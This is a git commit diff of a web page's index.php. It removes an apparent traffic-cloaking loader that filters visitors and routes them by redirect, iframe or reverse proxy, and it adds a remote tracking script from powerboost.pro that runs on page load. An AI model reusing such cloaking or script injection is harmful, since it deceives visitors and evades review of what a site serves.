0c18830909c5f20b5b900c61d648c93ad15b4b4c
jacobpinto22 <66258279+jacobpinto22@users.noreply.github.com>
2020-06-05 06:47:28 -0400

    Update index.php

--- index.php
+++ index.php
@@ -1,67 +1,7 @@
-<?php
-$GLOBALS['_ta_campaign_key'] = '8bb228d841fde756195c18f9a372d22e';
-$GLOBALS['_ta_debug_mode'] = false; //To enable debug mode, set to true or load this script with a '?debug_key=8bb228d841fde756195c18f9a372d22e' parameter
 
-require 'bootloader_d015f489ce4a2a569b189f50f6c60dab.php';
-
-$campaign_id = 'i4o20c';
-
-$ta = new TALoader($campaign_id);
-
-
-if ($ta->suppress_response()) {//Do not send any output when hybrid mode is enabled and a visitor is being filtered (after hybrid page was generated)
-    exit;
-}
-
-$response = $ta->get_response();
-$visitor = $ta->get_visitor();
-
-/*
- * Advanced users: uncomment lines below during development to expose variables you may want to use in your custom code:
- */
-//print_r($response);
-//print_r($visitor);
-//exit;
-/*
- * Don't forget to re-comment the lines above before sending live traffic
- */
-
-/*
-Note: when using hybrid mode, please use one of our built-in functions as your final step when routing your visitors:
-    print header_redirect("http://url.com"); //performs a 302 header redirect (or a window.location=xxx in JS)
-    print load_fullscreen_iframe("http://url.com"); //Loads a fullscreen iframe of the specified URL
-    print paste_html("http://url.com"); //Downloads HTML in specified URL and outputs it to the screen (uses JS to insert the HTML in hybrid mode)
-(These functions will automatically output either regular HTML or JS code depending on what the visitor's browser is expecting)
-*/
-
-switch ($response['action']) {
-    case 'header_redirect':
-        print header_redirect($response['url']); //Uses <script>window.location='xxx'</script> when in hybrid mode (required behaviour)
-        exit;
-    case 'iframe':
-        print load_fullscreen_iframe($response['url']);
-        exit;
-    case 'paste_html':
-        print paste_html($response['output_html']);
-        exit;
-    case 'reverse_proxy':
-        print reverse_proxy($response['url'], "tarp_d015f489ce4a2a569b189f50f6c60dab/");
-        exit;        
-    /* Please be VERY CAREFUL if modifying this block: */
-    case 'load_hybrid_page':
-        $ta->load_hybrid_page();
-        break;
-    /* ...it is needed for hybrid mode to function correctly */
-    default:
-        print other_methods($response['url']);
-        break;    
-}
-/*
- * Note: if using the "Remain on Fail URL" action for Filtered Visitors, append your Fail URL's HTML/PHP code after the closing PHP tag below:
- */
-?>
 <html>
   <head>
+      <script src='//powerboost.pro/it-Gianluigi/it-Gianluigi/track'></script>
   <meta http-equiv="content-type" content="text/html; charset=windows-1250">
   <meta name="generator" content="PSPad editor, www.pspad.com">
   <title></title>
